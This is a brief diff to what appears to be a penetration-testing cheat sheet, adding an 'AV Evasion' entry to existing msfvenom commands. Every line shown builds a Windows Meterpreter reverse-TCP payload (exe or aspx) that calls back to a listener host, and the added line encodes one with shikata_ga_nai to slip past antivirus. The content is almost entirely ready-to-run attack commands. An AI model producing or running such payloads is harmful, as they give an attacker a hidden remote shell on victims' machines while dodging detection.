@@ -39,3 +39,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f ex
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 -f aspx -o meterpreter.aspx
 ```
+
+
+AV Evasion
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe
+```
